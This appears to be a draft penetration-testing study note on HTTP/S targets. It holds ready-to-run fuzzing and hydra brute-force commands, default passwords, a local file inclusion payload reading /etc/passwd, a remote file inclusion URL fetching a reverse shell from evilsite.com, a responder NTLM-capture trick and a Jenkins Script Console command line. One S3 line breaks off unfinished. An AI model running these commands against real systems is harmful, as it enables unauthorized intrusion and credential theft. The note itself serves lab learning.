---
title: http/s
aliases: []
tags:
- study-notes/http-api
- tool/ffuf
- tool/gobuster
- tool/recon-ng
- tool/theHarvester
- tool/spiderfoot
- tool/hydra
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: http.md
related_tools:
- '[[ffuf]]'
- '[[gobuster]]'
- '[[recon-ng]]'
- '[[theHarvester]]'
- '[[spiderfoot]]'
- '[[hydra]]'
related_techniques:
- '[[t1008]]'
- '[[t1110]]'
- '[[t1190]]'
related_tactics:
- '[[ta0003]]'
related_services:
- '[[jenkins]]'
- '[[s3]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# http/s

## Scan
- fuzz virtual hosts (add virtual hosts to your /etc/hosts file)
  - `ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://$hn:$port/ -H 'Host: FUZZ.$hn' -t 100 -o scans/vhosts.ffuf`
  - `gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://board.htb -t 100 --append-domain`
- fuzz directories
  - `ffuf -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -u http://$ip:$port/FUZZ -recursion -t 100 -o scans/dir.ffuf`
  - `gobuster dir -u http://$ip -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -k -t 30 -b 302 -o scans/dir.gobuster`
  - `--exclude-length 100`
  - `feroxbuster --url "http://$ip" --wordlist /usr/share/SecLists/Discovery/Web-Content/raft-medium-words.txt --threads 100 -o scans/ferox-medium`
- fuzz extensions
  - `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://$hn:$port/indexFUZZ -H 'Host:$hn' -t 100 -o scans/fileext.ffuf`
- fuzz pages
  - `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://$ip:PORT/blog/FUZZ.php -t 100 -o scans/pages.ffuf`
  - get `ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://$hn:$port/admin/admin.php?FUZZ=key -t 100 -o scans/get.ffuf`
  - post `ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://$hn:$port/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -t 100 -o scans/post.ffuf`
  - `feroxbuster --url "http://10.10.10.245" --wordlist /usr/share/SecLists/Discovery/Web-Content/raft-medium-words.txt --threads 100 -o scans/ferox-medium -x php`
- spidering
  - reconspider
    - requires scrapy `pip3 install scrapy`
    - `wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip`
    - `python3 ReconSpider.py http://inlanefreight.com`
- automating recon
  - [finalrecon](https://github.com/thewhiteh4t/FinalRecon)
    - `git clone https://github.com/thewhiteh4t/FinalRecon.git && cd FinalRecon`
    - `pip3 install -r requirements.txt`
    - `chmod +x ./finalrecon.py`
    - `./finalrecon.py --help`
  - [recon-ng](https://github.com/lanmaster53/recon-ng)
  - [theHarvester](https://github.com/laramies/theHarvester)
  - [spiderfoot](https://github.com/smicallef/spiderfoot)

## Brute Force
- try default passwords
  - `admin:admin` `root:root` `admin:password`, `admin:admin1`
- basic auth
  - `hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip -s PORT http-get /`
- known password
  - `hydra -L /usr/share/SecLists/Usernames/Names/names.txt -p amormio -u -f $ip -s PORT http-get /`
- usernames and rockyou
  - `hydra -L /usr/share/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f $ip -s PORT http-get /`
- webform format
  - `hydra [options] target http-post-form "path:params:condition_string"`
    - looking for failure keywords Invalid credentials `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"`
    - looking for success redirect 302 `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
    - looking for sucess keyword Dashboard `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"`
    - webform `sudo hydra -P /usr/share/wordlists/rockyou.txt -l admin -f $ip -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
    - `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`

## Vulnerabilities
- local file inclusion
  - `https://example-site.com/?module=contact.php`
  - `https://example-site.com/?module=../../../etc/passwd`
- remote file inclusion
  - `https://example-site.com/?module=contact.php`
  - `https://example-site.com/?module=https://victim.com/?module=http://evilsite.com/reverseshell.php`
  - responder
    - setup responder `sudo responder -I tun0 -w -d`
    - url request `http://unika.htb/index.php?page=//10.10.14.7/myfakeshare`
    - responder returns ntlm hash, cracked using hashcat mode 5600
- log poisoning
- if the page repeats your input back to you
  - [server side template injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## Services
- jenkins
  - [Dashboard] - [Manage Jenkins] - [Script Console]
    - `println "ls -la".execute().text`
- s3 bucket
  - default returns this `{

## References
- https://github.com/thewhiteh4t/FinalRecon
- https://github.com/lanmaster53/recon-ng
- https://github.com/laramies/theHarvester
- https://github.com/smicallef/spiderfoot

